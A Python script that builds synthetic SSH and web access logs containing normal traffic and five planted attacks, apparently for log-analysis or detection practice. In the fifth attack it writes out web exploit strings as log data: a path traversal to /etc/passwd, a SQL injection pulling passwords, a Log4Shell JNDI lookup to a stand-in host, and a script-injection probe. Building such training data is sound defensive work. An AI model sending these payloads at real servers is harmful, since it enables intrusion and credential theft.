"""Generate synthetic SSH and web logs: normal traffic plus five hidden attacks.
All attacker IPs come from reserved documentation ranges, so nothing here is real."""
import os, random
from datetime import datetime, timedelta

def generate(outdir, seed=7):
    rnd, day = random.Random(seed), datetime(2026, 11, 25)
    ssh, web = [], []

    def S(t, ok, user, ip, inv=False):
        ssh.append((t, f"{t:%b} {t.day:>2} {t:%H:%M:%S} web01 sshd[{rnd.randint(1000, 9999)}]: "
                       f"{'Accepted' if ok else 'Failed'} password for {'invalid user ' if inv else ''}{user} "
                       f"from {ip} port {rnd.randint(30000, 60000)} ssh2"))

    def W(t, ip, path, status, ua="Mozilla/5.0"):
        web.append((t, f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +0000] "GET {path} HTTP/1.1" '
                       f'{status} {rnd.randint(150, 5000)} "-" "{ua}"'))

    users = ["alice", "bob", "deploy"]
    for _ in range(40):                                   # normal logins, a few typos
        t, ip, u = day + timedelta(seconds=rnd.randint(0, 86399)), f"10.0.0.{rnd.randint(2, 30)}", rnd.choice(users)
        if rnd.random() < 0.1:
            S(t, False, u, ip)
        S(t + timedelta(seconds=8), True, u, ip)
    pages = ["/", "/about", "/products", "/contact", "/static/app.css", "/static/logo.png"]
    for _ in range(600):                                  # normal web traffic
        W(day + timedelta(seconds=rnd.randint(0, 86399)), f"172.16.{rnd.randint(0, 3)}.{rnd.randint(2, 60)}",
          rnd.choice(pages), 200)
    for _ in range(20):                                   # harmless stray 404s
        W(day + timedelta(seconds=rnd.randint(0, 86399)), f"172.16.{rnd.randint(0, 3)}.{rnd.randint(2, 60)}", "/old-page", 404)

    t0 = day + timedelta(hours=3, minutes=12)             # 1. SSH brute force
    for i in range(40):
        u = rnd.choice(["root", "admin"])
        S(t0 + timedelta(seconds=i * 4), False, u, "198.51.100.23", inv=u == "admin")
    t0 = day + timedelta(hours=9, minutes=30)             # 2. password spraying
    for i, u in enumerate(["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi",
                           "ivan", "judy", "mallory", "oscar", "peggy", "trent"]):
        S(t0 + timedelta(seconds=i * 60), False, u, "203.0.113.45", inv=u not in users)
    t0 = day + timedelta(hours=14, minutes=5)             # 3. failures, then a successful login
    for i in range(12):
        S(t0 + timedelta(seconds=i * 10), False, "deploy", "192.0.2.77")
    S(t0 + timedelta(seconds=125), True, "deploy", "192.0.2.77")
    t0 = day + timedelta(hours=11, minutes=20)            # 4. web directory scan
    for i, p in enumerate(["/wp-login.php", "/admin", "/.env", "/phpmyadmin", "/backup.zip", "/config.php"] * 10):
        W(t0 + timedelta(seconds=i * 1.5), "198.51.100.99", p, 404, "Nikto")
    t0 = day + timedelta(hours=16, minutes=45)            # 5. web exploit attempts
    for i, p in enumerate(["/download?file=../../etc/passwd", "/item?id=1%20UNION%20SELECT%20password%20FROM%20users",
                           "/search?q=${jndi:ldap://x.example/a}", "/page?x=<script>alert(1)</script>"]):
        W(t0 + timedelta(seconds=i * 7), "203.0.113.200", p, 500 if i else 200, "curl/8.4")

    os.makedirs(outdir, exist_ok=True)
    for name, rows in (("auth.log", ssh), ("access.log", web)):
        with open(os.path.join(outdir, name), "w") as fh:
            fh.write("\n".join(r for _, r in sorted(rows)) + "\n")

if __name__ == "__main__":
    generate("logs")
    print("Wrote logs/auth.log and logs/access.log")
